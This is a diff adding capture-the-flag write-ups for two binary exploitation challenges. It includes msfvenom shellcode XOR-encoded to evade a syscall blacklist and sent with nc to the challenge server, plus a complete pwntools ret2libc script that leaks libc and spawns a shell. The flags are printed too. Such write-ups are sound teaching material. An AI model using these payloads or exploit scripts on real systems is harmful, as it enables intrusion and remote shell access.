@@ -271,12 +271,213 @@ Flag: **umsc{WILLOW_TREE_CAMPSITE}**
 
 `Dockerfile`, `babysc.c`, `babysc`
 
+---
 
+### Solution
 
+First, we analyze using `checksec` to see possible attacks.
 
+```bash
+$ checksec babysc
+[*] '/home/kali/Downloads/pwn/babysc'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX unknown - GNU_STACK missing
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+    SHSTK:    Enabled
+    IBT:      Enabled
+    Stripped: No
+```
 
+We see that `RWX` has segments, that means that I can inject and run shellcode directly.
 
+```bash
+$ msfvenom -p linux/x64/exec CMD="cat /flag" -f raw -o payload.bin
 
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 46 bytes
+Saved as: payload.bin
 
+$ cat payload.bin | nc 34.133.69.112 10001
 
+```
 
+However, there was no response.
+
+![XOR Encoding](img/xorencoding.png)
+
+Then I use a simple xor encoding to bypass the blacklist and get the flag.
+
+```bash
+$ msfvenom -p linux/x64/exec CMD="cat /flag" -f raw -b '\x0f\x05\xcd\x80' \
+-e x86/call4_dword_xor -o payload_xor.bin
+
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/call4_dword_xor
+x86/call4_dword_xor succeeded with size 72 (iteration=0)
+x86/call4_dword_xor chosen with final size 72
+Payload size: 72 bytes
+Saved as: payload_xor.bin
+
+$ cat payload_xor.bin | nc 34.133.69.112 10001
+Enter 0x1000
+Executing shellcode!
+umcs{shellcoding_78b18b51641a3d8ea260e91d7d05295a}
+
+```
+
+This is the exploit command:
+
+```bash
+msfvenom -p linux/x64/exec CMD="cat /flag" -f raw -b '\x0f\x05\xcd\x80' -e x86/call4_dword_xor -o payload_xor.bin
+```
+
+Flag: **umcs{shellcoding_78b18b51641a3d8ea260e91d7d05295a}**
+
+## Liveleak
+## Description
+> No desc
+> 
+> 34.133.69.112 port 10007
+
+`chall`, `Dockerfile`, `ld-2.35.so `, `libc.so.6`
+
+---
+
+## Solution
+
+First we analyze using `checksec` to see possible attacks.
+
+```bash
+$ checksec chall
+[*] '/home/kali/Downloads/pwn/chall'
+     Arch:     amd64-64-little
+     RELRO:    Partial RELRO
+     Stack:    No canary found
+     NX:       NX enabled
+     PIE:      No PIE (0x3ff000)
+     RUNPATH:  b'.'
+     SHSTK:    Enabled
+     IBT:      Enabled
+     Stripped: No
+```
+
+Then I got this output which means:
+
+No canary ➔ Stack buffer overflow possible.
+
+`NX` enabled ➔ Stack is non-executable (need `ROP`). 
+
+No `PIE` ➔ Static addresses (`ROP` is easier).
+
+```bash
+$ gdb ./chall
+```
+
+Then, we need to find the buffer offset, using `gdb`.
+
+```bash
+(gdb) run <<< $(cyclic 500)
+Starting program: /home/kali/Downloads/pwn/chall <<< $(cyclic 500)
+warning: Expected absolute pathname for libpthread in the inferior, but got: ./libc.so.6.
+warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
+Enter your input:
+```
+
+Then we do this to identify how many bytes are needed to overwrite important registers.
+
+The program crashed with a segmentation fault at:
+
+```bash
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000401291 in vuln ()
+```
+
+Then we inspect the using `info registers`.
+
+```bash
+(gdb) info registers
+rax            0x7ffffffdbd00    140737488346064
+rbx            0x0               0
+```
+
+```bash
+rbp            0x6161617261616171   0x6161617261616171
+rsp            0x7fffffffdc18    0x7fffffffdc18
+r8             0x0               0
+r9             0x0               0
+r10            0x7ffff7c06270    140737349968496
+r11            0x246             582
+r12            0x7fffffffdc38    140737488346424
+r13            0x401292          4199058
+r14            0x403e18          4210200
+r15            0x7ffff7fdd040    140737354125376
+rip            0x401291          0x401291 <vuln+53>
+```
+
+From this we know that rbp was overwritten, and `RIP` is located 8 bytes above `RBP` on the stack, we use the cyclic pattern to find the offset.
+
+```bash
+$ cyclic -l 0x6161617261616171
+
+64
+```
+
+`OFFSET = 64 + 8 = 72 bytes`
+
+Then, I gave all the collected information I have to **chatgpt** to create an exploit script.
+
+```bash
+from pwn import *
+
+# Setup
+context.binary = elf = ELF('./chall')
+libc = ELF('./libc.so.6')
+p = remote('34.133.69.112', 10007)
+
+rop = ROP(elf)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret = rop.find_gadget(['ret'])[0]
+
+# Stage 1: Leak puts
+payload = flat(
+    b'A' * 72,
+    pop_rdi,
+    elf.got['puts'],
+    elf.plt['puts'],
+    elf.symbols['main']
+)
+p.sendlineafter("Enter your input:", payload)
+
+p.recvline()
+leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
+libc.address = leaked_puts - libc.symbols['puts']
+
+# Stage 2: system("/bin/sh")
+payload2 = flat(
+    b'A' * 72,
+    pop_rdi,
+    next(libc.search(b'/bin/sh')),
+    ret,
+    libc.symbols['system']
+)
+p.sendlineafter("Enter your input:", payload2)
+p.sendline(b'cat flag_copy')
+
+try:
+    print(p.recvuntil(b"}", timeout=3).decode())
+except EOFError:
+    print("❌ Early EOF")
+
+p.close()
+```
+
+run the exploit script. Then, got the flag!
+
+Flag: **umcs{GOT_PLT_8f925fb19309045dac4db4572435441d}**
